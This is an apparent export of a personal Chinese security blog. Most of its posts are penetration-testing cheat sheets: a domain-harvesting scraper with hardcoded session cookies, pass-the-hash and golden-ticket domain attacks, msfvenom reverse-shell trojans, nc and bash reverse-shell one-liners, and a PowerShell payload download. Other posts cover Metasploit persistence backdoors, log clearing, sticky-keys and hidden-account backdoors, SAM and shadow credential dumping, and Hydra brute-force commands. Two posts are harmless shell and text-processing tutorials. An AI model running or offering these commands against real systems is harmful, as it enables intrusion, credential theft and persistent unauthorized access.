{"meta":{"title":"pengpengp's BLOG","subtitle":null,"description":null,"author":"pengpengp","url":"https://pengpengp.github.io"},"pages":[],"posts":[{"title":"python批量爬取URL配合AWVS","slug":"python批量爬取URL配合AWVS","date":"2019-03-31T00:18:31.000Z","updated":"2019-03-31T00:39:26.626Z","comments":true,"path":"2019/03/31/python批量爬取URL配合AWVS/","link":"","permalink":"https://pengpengp.github.io/2019/03/31/python批量爬取URL配合AWVS/","excerpt":"","text":"1.1. 用这段代码先爬出厂商的URL地址,写入到一个文本文档 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103#!coding:utf-8try: import queue as Queueexcept Exception as e: #导入queue''' import Queueimport requestsimport reimport threading#厂商id=(30-4555)#厂商id=(61785,61184)#创建请求def qq(que): while not que.empty(): id=que.get() url='https://URL/Loo/submit?cid=&#123;&#125;'.format(id) cookie =&#123;'PHPSESSID':'b1e5pmgfeamvopn8fi5if23151','__guid':'138613664.2718517027106703000.1552008209413.7473','__DC_sid':'138613664.506728041006725900.1553871635984.757','Q':'u%3D360H3104709625%26n%3D%26le%3D%26m%3DZGp2WGWOWGWOWGWOWGWOWGWOZwVm%26qid%3D3104709625%26im%3D1_t01923d359dad425928%26src%3Dpcw_webscan%26t%3D1','T':'s%3D184251f5a38ba45d06144c26cf5f02e2%26t%3D1552008252%26lm%3D%26lf%3D2%26sk%3Dc19128be09646066b6bb9a543a35569a%26mt%3D1552008252%26rc%3D%26v%3D2.0%26a%3D1'&#125; headers = &#123;'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'&#125; qingqiu = requests.get(url,cookies=cookie,headers=headers).text.encode('utf8') #qingqiu.decode('raw_unicode_escape') #qingqiu.encoding = qingqiu.apparent_encoding #print (qingqiu) company = re.findall(r'\"请输入厂商名称\"\\svalue=\"(.*?)\"',qingqiu) yuming = re.findall(r'\"请输入厂商域名\"\\svalue=\"(.*?)\"',qingqiu) print ('https://URL/Loo/submit?cid=&#123;&#125;扫描成功!'.format(id)) f = open('list.txt','a') #f.write((company)[0]) f.write((yuming)[0]) f.write(\"\\n\") f.close() if que.empty(): print ('url获取完毕!')#创建队列que = Queue.Queue()for q in range(30,4555): que.put(q)#创建线程xianchengmax=[]for i in range(1): xiancheng = threading.Thread(target=qq,args=(que,)) xianchengmax.append(xiancheng)for xiancheng in xianchengmax: xiancheng.start()for xiancheng in xianchengmax: xiancheng.join() 再从文本文档中筛选出合格的URL,(^[http://|https://].*)这个可以先把规范的URL匹配出来 3.1. 把不合适的URL修改成合格的URL,添加到AWVS中,AWVS只能之别出标准格式的URL,所以这些不带http://的就需要修改一下，如果还剩下了 也可以再匹配,这样逐步把URL的格式规范化了 把选好的URL加入AWVS的批量扫描列表中http://localhost:8183/ 可以开始扫描了","categories":[],"tags":[{"name":"python 扫描","slug":"python-扫描","permalink":"https://pengpengp.github.io/tags/python-扫描/"}]},{"title":"first shell","slug":"first-shell","date":"2019-03-24T09:20:15.000Z","updated":"2019-03-24T09:21:21.961Z","comments":true,"path":"2019/03/24/first-shell/","link":"","permalink":"https://pengpengp.github.io/2019/03/24/first-shell/","excerpt":"","text":"12345678910111213141516171819#!/bin/bashecho $*if [ $# == 0 ];then echo '-h获取帮助'; exitelif [ $1 = '-h' ];then echo 'search使用说明:先输入-p 后面加路径，再输入-f后面加搜索的文件';elif [ $1 ] &amp;&amp; [ $3 ] &amp;&amp; [ $1 = '-p' ] &amp;&amp; [ $3 = '-f' ]; then echo \"files:\" find $2/ -iregex \".*$4.*\" count=$(find $2/ -iregex \".*$4.*\" |wc -l) echo \"count:$count\";else echo \"请检查输入是否正确\";fi","categories":[],"tags":[{"name":"shell 脚本 Linux search","slug":"shell-脚本-Linux-search","permalink":"https://pengpengp.github.io/tags/shell-脚本-Linux-search/"}]},{"title":"域渗透","slug":"域渗透","date":"2019-03-24T08:29:01.000Z","updated":"2019-03-24T09:04:28.828Z","comments":true,"path":"2019/03/24/域渗透/","link":"","permalink":"https://pengpengp.github.io/2019/03/24/域渗透/","excerpt":"","text":"一。搭建域环境：作用：批量控制 1.域控制器的配置：服务器管理器-&gt;添加角色-&gt;勾选域服务-&gt;下一步-&gt;安装运行-&gt;dcpromo启动域安装程序-&gt;创建一个”林”-&gt;命名-&gt;林功能级别”默认”-&gt;一直下一步-&gt;设置域控密码-&gt;一直下一步-&gt;重启。 2.把主机加入域控：​ 计算机属性-&gt;更改域设置-&gt;隶属于-&gt;在域控中选择users-&gt;点右键，新建用户-&gt;注意用户名和密码​ 注意：需要防火墙通过域网络 二。了解域1.关键词： 域控 域主机 域管理员：administrator 可以登陆域中任意一台主机 域账户：域控创建的“网络账户” 远程桌面禁止登陆 默认情况下也可以登陆所有的主机 域用户查看等命令只有用域账户登陆才能执行 本地账户：原有账户 2.域的操作命令 ipconfig/all可以查看是否在域中、 ping 域名可以获取域控的ip地址 et user “domain controllers” /domain 查询域控ip net user /domain 查看域中的用户 dsquery user #查看域控域所有域用户详细信息 dsquery server #查看所有域控制器 net localgroup administrators zhuyu\\test /add #把zhuyu域控域用户test添加到本地管理员组 net view #查看域中的主机 nte view/domain #查看所有域 三。域渗透大体方式1.域中的远程磁盘映射net use H: \\\\ip\\c$ &quot;password&quot; /user:username net use H: /D #删除H磁盘的映射 2.添加计划任务：net time \\ip #获取系统时间at \\ip 10:57:00 /c “commond” #在10点57添加一项计划任务 at \\ip 1 /delete #删除任务1注意：net use 命令需要administrator用户连接，其他用户不行 3.工具： psexec #远控工具，通过用户名和密码，直接执行命令 –accepteula #打开时不弹窗 wmiexec.exe #远控工具，域中使用 wmiexec -hashes 00000000000000000000000000000000:03bebb338e70244589ea67c7439c77ba TEST/administrator@192.168.0.100 “whoami 四。.攻击具体流程和思路 获取域账户密码( 获取hash的工具 mimikatz getpasswd pwdump7 (1)管理员的-&gt;用户名和密码、 123用工具获取hash：`wimexec.exe -hashs ntlm_hash domain/uname@ip cmd`如果获取了明文密码：`net use \\\\ip\\ipc$ &quot;pass&quot; /user:uname` 挂载分区，执行命令`psexec -h ip -u name -p pass cmd ` ​ (2)普通用户的-&gt;网站是否存在域控ms14-068漏洞、 12用`wimexec.exe -hashs ntlm_hash domain/uname@ip cmd`,普通用户一般没有权限用`ms14-068漏洞 -u 域成员们@域名 -s 域成员sid -d 域控ip -p域成员密码` ​ (3)是否存在krbtgt用户-&gt;获取hash就相当于域控*** 1如果获取了此用户hash==黄金票据 直接用mimikatz攻击 ​ (4)本地账户的-&gt;账户和明文密码 1扫描内网ip,有没有使用相同的口令 ​​ 域中其他的主机使用web或ms漏洞攻击","categories":[],"tags":[{"name":"windows 域 域渗透","slug":"windows-域-域渗透","permalink":"https://pengpengp.github.io/tags/windows-域-域渗透/"}]},{"title":"常用渗透工具","slug":"常用渗透工具","date":"2019-03-16T08:58:09.000Z","updated":"2019-03-21T08:39:15.808Z","comments":true,"path":"2019/03/16/常用渗透工具/","link":"","permalink":"https://pengpengp.github.io/2019/03/16/常用渗透工具/","excerpt":"","text":"web测试常用工具整理:一.burpsuite1.Macros模块:project-&gt;macros爆破数字验证码:https://blog.csdn.net/d_pokemon/article/details/78194351 2.intruder模块四种攻击方式: 1234Sniper(单字典顺序爆破):常用battering ram(单字典赋予所有变量取相同值)pitchfork(双字典同时顺序爆破)cluster bomb(多字典混合爆破).常用*** 3.Proxy代理功能:User options-&gt;socks proxy 参考:https://blog.csdn.net/snert/article/details/49749757(爆破数字验证码讲解) https://blog.csdn.net/xiaohua_de/article/details/80290882(爆破方式图解) 二.sqlmap参数 命令 解释 -u &quot;地址&quot; 指定存在注入的url --dbms 指定数据库类型 --dbms-cred=DBMS.&nbsp;&nbsp;&nbsp; 数据库的认证,例子:–dbms-cred=”name:password” --dbs 搜索所有库 -D 指定某个数据库 -table 搜索所有表 -T 指定某个表 -column 搜搜所有字段 -C 指定某个字段 -dump 提取当前数据 -v 显示信息[1-6] --users 查询一共都有哪些用户，常用，直接用–users --passwords 查询用户密码的哈希，常用，直接用–passwords --privileges 查看特权，常用。例 –privileges -U username (CU 就是当前用户) --method=&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 指定提交方式—-例子–method=GET –method=POST –proxy 使用代理,例子 –prefix 增加前缀,例子 --suffix 增加后缀 --level 设置测试的等级[1-5],默认1 --technique=TECH&nbsp;&nbsp;&nbsp; 指定所使用的技术（B:布尔盲注;E:报错注入;U:联合查询注入;S:文件系统，操作系统，注册表相关注入;T:时间盲注; 默认全部使用） --time-sec=TIMESEC&nbsp;&nbsp; 在基于时间的盲注的时候，指定判断的时间，单位秒，默认5秒。 --dns-domain=DNS.. 如果你控制了一台dns服务器，使用这个可以提高效率,例子:–dns-domain 123.com 高级: --tamper &quot;*.py&quot;:使用绕过脚本 —-例子:charencode.py/charunicodeencode.py:重要* --cookie:指定cookie值:重要 —-例子:-u “www.abc.com/index.php?id=1&quot; –cookie=”a=1;b=2” --user-agent:指定user-agent内容 --host:指定host内容 --referer:指定referer -H --headers 额外的header头:重要 —-例子:–headers=”host:www.a.com\\nUser-Agent:yuangh&quot; --ignore-proxy 无视本地的代理 --ignore-redirects 无视http重定向，比如登录成功会跳转到其他网页，可使用这个忽略掉。 --timeout=TIMEOUT 请求超时的时间，单位为秒，浮点数，默认30s。 -f:指纹信息，返回DBMS，操作系统，架构，补丁等信息。 –tor :-tor-port:手动设置TOR代理， -tor-type:检查你的代理是否被正确地安装并正常的工作 —-安装:sudo apt-get install tor tor-geoip —-举例:进入sqlmap的目录后:./sqlmap.py -u “http://www.targetvuln.com/index/php?cata_id=1&quot; -b -a -tor –check-tor–user-agent=”Mozilla/5.0(compatible;Googlebot/2.1;+http://www.google.com/bot.html)&quot; shell --os-cmd=OSCMD 执行一句系统命令。 —-举例:–os-shell=”ipconfig -all” --os-shell 创建一个对方操作系统的shell，远程执行系统命令 --priv-esc 自动提权，数据库进程用户权限提升。 --msf-path=MSFPATH Metasploit Framework本地的安装路径。 --tmp-path=TMPPATH 远程临时文件目录的绝对路径。 --reg-add 添加一个注册表。 --reg-del 删一个注册表。 --wizard 新手教程。 三.nmap最常用 命令 解释 -p1-65535 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 扫描指定端口 -p2,3,4 10.0.1.161 -p20-200,7777,8888 指定不连续端口 -sU udp 端口扫描 扫描完6万个端口需要20分钟左右 -Pn 不对目标进行ping探测（不判断主机是否在线）（直接扫描端口） -V 详细信息 -A 操作系统和版本信息 -O 检测操作系统 -sA 探测是否使用了防火墙 –例子:All 1680 scanned ports on server2.tecmint.com (192.168.0.101) are UNfiltered -sP 仅探测是否在线 -sT/sU/sS TCP/UDP/半开放扫描 -sL (Idlescan)使用另外一个目标网络的主机发送数据包.隐藏自己ip:重要** --iflist 检测主机接口和路由信息:重要** -iL 指定ip文件 -F 快速扫描，仅扫描列在nmap-services文件中的端口而避开所有其它的端口。 -r 顺序端口扫描(扫所有端口) ​ 常用 命令 解释 , - 用空格或-或,-例子:nmap 10.0.1.161 10.0.1.162 nmap 10.0.1.161-162 nmap 10.0.1.161,162 10.0.3.0/24 nmap 10.0.3.0/24 --exclude 排除某个ip —-例子 排除连续ip:nmap 10.0.1.161-162 –exclude 10.0.1.162 —-例子 排除多个ip:nmap 10.0.1.161-163 –exclude 10.0.1.162-163 —-例子 排除不连续ip:nmap 10.0.1.161-163 –exclude 10.0.1.161,10.0.1.163 —-例子 排除文件内ip:nmap 10.0.1.161-163 –excludefile ex.txt -sF-sX-sN 秘密FIN数据包扫描、圣诞树(XmasTree)、空(Null)扫描模式：即使SYN扫描都无法确定的情况下使用** -bFTP 反弹攻击(bounceattack)** 端口状态: 命令 解释 open 应用程序在该端口接收 TCP 连接或者 UDP 报文。 closed 关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。 filtered 由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。 unfiltered 未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。 open filtered closed filtered 参考文档:https://jingyan.baidu.com/article/47a29f24312010c0142399f1.html深度剖析了nmap 四.MSF​ 1.生成windows下的exe反弹木马 msfvenom -p windows/meterpreter/reverse_tcp LHOST=60.205.212.140 LPORT=8888 -f exe &gt; 8888.exe // -p &lt; payload &gt; -f &lt; format&gt; -o &lt; path&gt; = &gt; 生成linux的反弹elf木马 msf5 &gt; use payload/linux/x64/meterpreter/reverse_tcp msf5 payload(linux/x64/meterpreter/reverse_tcp) &gt; set lhost 192.168.5.187 msf5 payload(linux/x64/meterpreter/reverse_tcp) &gt; set lport 20000 msf5 payload(linux/x64/meterpreter/reverse_tcp) &gt; generate -h generate -f elf -o ~/Desktop/centos.elf 2.监听 use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 172.17.150.246 //阿里云云服务器这里是内网ip set LPORT 8888 exploit -j 3.内网代理 首先需要链接sessions,在此基础下添加路由 meterpreter &gt; run get_local_subnets //获取网段 meterpreter &gt; run autoroute -s 172.2.175.0/24 //添加路由 meterpreter &gt; run autoroute -p //查看路由 meterpreter &gt; run autoroute -d -s 172.2.175.0 //删除网段 meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24 //探测该网段下的存活主机。 meterpreter &gt; background //后台sessions 4.提权 (1)getsystem meterpreter &gt; getsystem //直getsystem提权，最常用简单的办法 (2)使用exp提权 meterpreter &gt; background //先后台运行会话 [*] Backgrounding session 1… msf &gt; use post/windows/escalate/ms10_073_kbdlayout msf &gt; show options msf &gt; set session 1 //设置要使用的会话 msf post(ms10_073_kbdlayout) &gt; exploit 注意：如果创建了一个system进程，就可以立马sessions 1进入会话，然后ps查看进程，使用migrate pid注入到进程。 或者直接： meterpreter &gt; run post/windows/escalate/ms10_073_kbdlayout (3)盗取令牌 meterpreter &gt; use incognito //进入这个模块 meterpreter &gt; list_tokens –u //查看存在的令牌 meterpreter &gt; impersonate_token NT AUTXXXX\\SYSTEM //令牌是DelegationTokens一列，getuid查看，两个斜杠 (4)过UAC msf &gt; use exploit/windows/local/bypassuac //32位与64位一样，其他几个模块也一样 msf &gt; show options msf &gt; set session 4 msf &gt; run //成功后会返回一个新的session，进入新会话，发现权限没变，使用getsystem即可完成提权 (5)Hash meterpreter &gt; run post/windows/gather/smart_hashdump //读取hash这种做法最智能，效果最好。 5.留后门(1)服务留后门： meterpreter &gt; run metsvc -A //再开起一个终端，进入msfconsole msf &gt; use exploit/multi/handler //新终端中监听 msf &gt; set payload windows/metsvc_bind_tcp msf &gt; set LPORT 31337 msf &gt; set RHOST 192.168.0.128 msf &gt; run //获取到的会话是system权限 (2)启动项后门： meterpreter &gt; run persistence -X -i 10 -p 6666 -r 192.168.71.105 ​ // -X 系统开机自启，-i 10 10秒重连一次，-p 监听端口，-r 监听机。直接监听就好了，他自己会链接回来。 ​ 注意到移除 persistence 后门的办法是删除 HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ 中的注册表键和 C:\\WINDOWS\\TEMP\\ 中的 VBScript 文件。 ​ 缺点：容易被杀毒软件杀 。 6.爆破ssh use auxiliary/scanner/ssh/ssh_login set rhosts 7.7.7.20 set username root set pass_file /root/pass.txt //加载字典，可以收集密码做字典 set threads 50 run 7.nmap扫描基本信息 msf &gt; nmap –script=vuln 受害靶机ip地址 msf &gt; nmap –script=mysql-info 192.168.0.4 //扫描mysql数据库信息 版本 等.. 8.清除记录 msf &gt; clearev //删除目标机上的应用程序、系统和安全日志。 MSF常用命令： 命令 解释 截图 screenshot 查看是否是虚拟机 run checkvm 查看运行木马的用户 getuid 注入到进程 migrate pid //成功会提示successfully 加载mimikatz模块 meterpreter &gt; load mimikatz meterpreter &gt; wdigest//需要system权限 获取键盘记录 meterpreter&gt; run post/windows/capture/keylog_recorder //运行键盘记录模块，他自己创建本文。 msf部分取自：http://www.cnblogs.com/hookjoy/p/7989715.html 五Hydra 参数 用途 -R 根据上一次进度继续破解 -S 使用SSL协议连接 -s 指定端口 -l 指定用户名 -L 指定用户名字典(文件) -p 指定密码破解 -P 指定密码字典(文件) -e 空密码探测和指定用户密码探测(ns) -C 用户名可以用:分割(username:password)可以代替-l username -p password -o 输出文件 -t 指定多线程数量，默认为16个线程 -vV 显示详细过程 -f 一旦破解成功就停止 实例： 目的 实例 破解ssh的密码 hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh 破解https hydra -m /index.php -l username -P pass.txt IP https 破解smb hydra -l administrator -P pass.txt IP smb 破解rdp hydra IP rdp -l administrator -P pass.txt -V 破解http-proxy hydra -l admin -P pass.txt http-proxy://10.36.16.18 破解telnet hydra IP telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V 破解ftp1 hydra IP ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV 破解ftp2 hydra IP ftp -l 用户名 -P 密码字典 -e ns -vV get方式提交，破解web登录1 hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns IP http-get /admin/ get方式提交，破解web登录2 hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f IP http-get /admin/index.php` post方式提交，破解web登录1 hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form post方式提交，破解web登录2 index.php:name=^USER^&amp;pwd=^PASS^:&lt;title&gt;invalido&lt;/title&gt;","categories":[],"tags":[{"name":"常用工具及使用","slug":"常用工具及使用","permalink":"https://pengpengp.github.io/tags/常用工具及使用/"}]},{"title":"内网穿透工具","slug":"内网穿透工具","date":"2019-03-10T09:01:24.000Z","updated":"2019-03-10T10:21:27.815Z","comments":true,"path":"2019/03/10/内网穿透工具/","link":"","permalink":"https://pengpengp.github.io/2019/03/10/内网穿透工具/","excerpt":"","text":"内网转发的三种：反弹shell、反弹端口、反弹代理虚拟终端和bash -i的区别： bash -i是交互式的shell，很多程序都要求用交互式shell 一。反弹shell nc的使用： 有两种方式： 1.被动连接(让被攻击者反弹到监听) powershell中反弹命令： nc ip port -e cmd.exe nc ip port -e /bin/bash bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1 监听nc -lnvp port 2.主动连接(主动连接被攻击者) 特点：攻击者不需要公网ip，但是被攻击的服务器必须在公网上 被攻击： nc -lnvp port -e cmd nc -lnvp port -e /bin/bash 攻击： nc ip port 还有其他反弹的方式：如perl、php、python语言反弹http://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html 二。反弹端口流程：A出-&gt;B入-&gt;B出-&gt;C入（A为攻击者、B为getshell机器、C为内网被攻击者） 工具：lcx(windows)、frp lcx工具的使用： 步骤一：外网服务器开启监听 lcx -listen 4444 12345 步骤二：将被控主机端口转发到外网服务器 lcx.exe –slave 公网 IP + 端口 被控服务器IP + 端口 lcx -slave 1.1.1.1 4444 127.0.0.1 80 步骤三：在外网服务器连接本地12345端口 然后mstsc 127.0.0.1:12345 用nc进行文件传输: 12345A:`tar cfz - 文件名 | nc 10.0.1.162 9995`B:`nc -l 21000 | tar zxvf -`nc的使用:https://www.cnblogs.com/nmap/p/6148306.html frp的使用 123456789101112frpc.ini[common]bind_addr=0.0.0.0bind_port = 7000auto_token=12345678（密码可以自己修改）dashboard_port = 7500（网页登录端口）dashboard_user = admin（网页登录账户）dashboard_pwd = admin（网页登录密码）https://www.atsurak.com/frp-windows-rdp/ 常见要扫描的端口： 22端口—爆破，无意义hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh 80端口—http的注入 1433端口—mssql数据库 6379端口—外联redis -cli -h ip -p portconfig get dir 查看之前的设置路径config get dbfilename 查看之前的创建文件keys *查看之前创建的键，”key” “ssh”get ssh查看之前的键值 8000端口—网站 9000端口—nginx漏洞***找未授权类可以利用的端口，才有意义 等等 三。反弹代理 ew工具的使用： 第1种方式.在中间人服务器使用ew -s ssocksd -l 4444—在服务器上监听一个端口，所有发送到这个端口的流量都将被此服务器转发，(类似shadowsocks) 第2种方式.在攻击者和被攻击者服务器使用攻击者：ew -s rcsocks -l 1080 -e 6666 被攻击方：ew -s rssocks -d 192.168.11.123 -e 6666 多层内网穿透： 假设win2008R2在内网[无公网ip]并在一个独立的内网段,win2008也处在目标内网,假设在另一个内网段,centos 5.1同样也处在内网,可又在另一个单独的内网段且win2008R2能访问win2008,win2008能访问centos 5.1,而centos 5.1能访问目标核心网,要实现层层穿透,访问到核心网资源,我们就可以这样 1.先在win7[vps]上执行,把来自外部的1080端口流量转到本地的1235端口上 ./ew_for_Win.exe -s rcsocks -l 1080 -e 1235 2.在内网入口上执行,把win7[vps]的1235端口和内网win2008的3456端口绑定 ew_for_Win.exe -s lcx_slave -d 192.168.3.232 -e 1235 -f 192.168.32.170 -g 3456 3.在内网二层数据库服务器上执行,将来自外部的1236端口和本地的3456端口进行绑定./ew_for_Win.exe -s lcx_listen -l 3456 -e 1236 4.在最里层的linux上执行,将本地的socks连接反弹到win2008的1236端口上,此时再回到win2008上看会提示”rssocks cmd_socket OK!”,说明通道已经建立成功./ew_for_Linux32 -s rssocks -d 192.168.32.170 -e 1236 5.最后,再回到win7[vps]上利用Proxifier访问本地的1080就相当于访问centos 5.1的1236端口,即可轻松获取核心网的数据 对应的代理工具使用： 1.proxifier 2.SocksCap64 3.proxyChains工具 ​ 用代理时nmap -sT -Pn ip才能扫描到​ linux设置全局： ​ alias proxy=&#39;export all_proxy=socks5://127.0.0.1:1086&#39;​ alias unproxy=&#39;unset all_proxy&#39;​","categories":[],"tags":[{"name":"内网转发","slug":"内网转发","permalink":"https://pengpengp.github.io/tags/内网转发/"}]},{"title":"提权","slug":"提权","date":"2019-03-03T07:20:00.000Z","updated":"2019-03-03T07:45:38.128Z","comments":true,"path":"2019/03/03/提权/","link":"","permalink":"https://pengpengp.github.io/2019/03/03/提权/","excerpt":"","text":"0x00本地服务提权windows1.从外部攻击服务器 ms17-010 ms08-067 … 2.从内部攻击服务器 上传提权脚本 x64.exe\\pr.exe 然后运行就可以了 linux只能从内部攻击服务器 获取内核版本，操作系统版本， 去找对应的exp 下载exp.c文件，进行编译运行 0x01数据库提权redis未授权mssql直接执行命令mysql windows：开机启动项、mof脚本、udf函数 linux：udf函数、计划任务、ssh公钥 0x02第三方软件提权： server-u 远控软件 。。。 0x03维持权限(留后门)一。windows留后门 1.添加隐藏账户 可以完全隐藏—&gt;改注册表—&gt;https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/ 2.启用来宾账户并添加为管理员 注：从windows2008开始有来宾账户 3.shift后门 —用c:\\windows\\cmd.exe替换：c:\\windows\\system32\\sethc.exe 然后在登录界面就可以用粘滞键启动cmd了 4.启动项、计划任务(不推荐) 5.DLL劫持 6.powershell后门 7.远控软件 8.获取现有账号的密码(推荐) windows获取管理员密码： 获取密码： wce.exe QuarksPwDump.exe Pwdump7.exe x64.exe &quot;Pwdump7.exe&quot; 获取到hash值去somd5破解(或者彩虹表) gethash.exe mimikatz cain:登陆目标机器导出注册表成文件，然后用cain加载获取hash reg save hklm\\sam C:\\hash\\sam.hive reg save hklm\\system C:\\hash\\system.hive reg save hklm\\security C:\\hash\\security.hive 优点：免杀 powershell脚本获取密码： $client = new-object System.Net.WebClient; $client.DownloadFile(&apos;http://*.*.*.*/a.exe&apos;,&apos;D:\\GetPassword.exe&apos;); 注：关闭windows系统保护的方法 takeown /f c:\\windows\\system32\\*.* /a /r /d y cacls c:\\windows\\system32\\*.* /T /E /G administrators:F 二。linux留后门+获取root密码：获取密码：读/etc/shadow文件破解 加ssh公钥 加用户 计划任务 参考脏牛(修改passwd文件添加&quot;user:password:0:0&quot;)","categories":[],"tags":[{"name":"内网/提权","slug":"内网-提权","permalink":"https://pengpengp.github.io/tags/内网-提权/"}]},{"title":"grep.find.awk.sed指令基础","slug":"grep-find-awk-sed指令基础","date":"2019-03-03T06:24:29.000Z","updated":"2019-03-03T06:51:23.781Z","comments":true,"path":"2019/03/03/grep-find-awk-sed指令基础/","link":"","permalink":"https://pengpengp.github.io/2019/03/03/grep-find-awk-sed指令基础/","excerpt":"","text":"grep和find指定(匹配字符和文件名) grep ‘字符串’ 源文件，例如grep ‘代码执行’ 第* —从包含“第”的文件中查找包含代码执行的字符串 grep –color ‘字符串’ 文件名—匹配到的字符串高亮 find 目录 -name ‘字符串’，举例：find ./ -name ‘第*’ —查找名字包含“第”的文件 源文件都支持通配符匹配 awk指令(匹配列)解释： awk 动作 文件名 awk -F ‘:’—用-f指定字段分隔符为：冒号 $NF表示最后一个字段， \\$(NF-1)表示倒数第二个字段,举例：awk -F ‘:’ ‘{print $1, $(NF-1)}’ demo.txt —输出每行的第一和倒数第二个字段 \\$NR表示当前处理的行(可以给行加上行号),举例：$ awk -F ‘:’ ‘{print NR “) “ $1}’ demo.txt \\$ awk ‘{print $0}’ demo.txt —把每行原样输出 tolower()：字符转为小写。 length()：返回字符串长度。 substr()：返回子字符串。 sin()：正弦。 cos()：余弦。 sqrt()：平方根。 rand()：随机数。 实例： ### 格式：awk ‘条件 动作’ 文件名 awk -F &#39;:&#39; &#39;{ print toupper($1) }&#39; demo.txt awk -F &#39;:&#39; &#39;/usr/ {print $1}&#39; demo.txt —输出包含usr的每行第一个字段 awk -F &quot; &quot;&#39;{print $9}&#39;a.txt &gt;list.txt —把a.txt中被空格分隔的第九列内容重定向输出到list.txt中 awk &#39;BEGIN{a=&quot;100testa&quot;;if(a ~ /^100*/){print &quot;ok&quot;;}}&#39; —ok 正则匹配加判断 awk &#39;BEGIN{a=11;if(a &gt;= 9){print &quot;ok&quot;;}}&#39; —ok 加if判断 awk -F &#39;:&#39; &#39;NR % 2 == 1 {print $1}&#39; demo.txt —输出奇数行 awk -F &#39;:&#39; &#39;$1 == &quot;root&quot; || $1 == &quot;bin&quot; {print $1}&#39; demo.txt —输出第一字段等于root||bin行的第一个字段 awk -F &#39;:&#39; &#39;{if ($1 &gt; &quot;m&quot;) print $1; else print &quot;---&quot;}&#39; demo.txt —如果字段1大于m就输出它，否则输出— sed指令(匹配行)a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～ c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！ d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚； i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)； p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～ s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g 就是啦！ 实例： ​ nl /etc/passwd | sed &#39;/root/&#39;—搜索/etc/passwd 有root关键字的行 ​ sed &#39;s/^/#/g&#39; pets.txt—每行开头加个#号 ​ nl /etc/passwd | sed &#39;2,5c No 2-5 number&#39; —将第2-5行的内容取代成为No 2-5 number ​ nl /etc/passwd|sed -n &#39;/root/p&#39; —n表示只输出包含模板的行 ​ sed ‘s/要被取代的字串/新的字串/g’ ​ nl /etc/passwd | sed -n &#39;/root/{s/bash/blueshell/;p;q}&#39; —搜索/etc/passwd,找到root对应的行，执行后面花括号中的一组命令，每个命令之间用分号分隔，这里把bash替换为blueshell，再输出这行 ​ sed -i &#39;s/\\.$/\\!/g&#39; regular_express.txt ---sed 将 regular_express.txt 内每一行结尾若为 . 则换成 !","categories":[],"tags":[{"name":"linux命令之查找","slug":"linux命令之查找","permalink":"https://pengpengp.github.io/tags/linux命令之查找/"}]},{"title":"信息搜集","slug":"信息搜集","date":"2019-02-24T00:17:54.000Z","updated":"2019-02-24T01:24:49.745Z","comments":true,"path":"2019/02/24/信息搜集/","link":"","permalink":"https://pengpengp.github.io/2019/02/24/信息搜集/","excerpt":"","text":"只要能挖掘到对黑客有用的信息,就是信息泄露 目标：只要能挖掘到对黑客有用的信息,就是信息泄露*****需要搜集的信息: 分类(web安全方向)1234561.web服务器信息(中间件)2.web应用信息(web脚本,数据库类型,cms)3.服务器操作系统信息(系统版本)4.服务器其他信息(服务,端口)5.域名信息(子域名,ip)6.相关人员信息(注册域名相关人员) *****步骤:一.搜集域名(顶级域名,子域名)https://baidu.com 顶级子域名 https://www.baidu.com 二级子域名 https://baike.baidu.com https://a.b.baidu.com 三级子域名 http:/asdasd.com.cn 顶级域名 http://beijing.gov.cn 顶级域名 搜索方式:工具(layer,sublist3r,wydomain),谷歌(site:域名),网站(site.ip138.com)/(dnsdb.io),http证书,备案信息(icp.chinaz.com) 技巧1:在tool.chinaz.com的备案号查看所有顶级域名 技巧2.:域名+crossdomain.xml也可以查看其他子域名 技巧3:利用同源策略,通过子域名绕过当前无法突破的域名 二.搜集相关注册人1.通过搜集网站seo.chinaz.com–&gt; 2.通过浏览器插件portal查看*** 3.whois反查 三.搜集服务器信息1.判断操作系统 –&gt;通过开放的端口和服务(后台一直扫着就可以,同时往下进行) windows: iis 80 rpc 135 smb 445 rdp 3389 linux: ssh 22 NETBIOS 137 138 139 通过大小写 http://test.com/test.php `http://test.com/TEST.php` 通过nmap -O ip查看系统信息 2.脚本语言 识别伪静态 类似:http://test.com/index/id/49 3.web中间件 nmap -A选项 burp抓包查看response的server头 4.搜集cms信息 (1).查看首页源代码 (2).访问wp-login.php文件 (3).discuz(论坛)平台特性:包含forum.php文件 (4).robots.txt文件 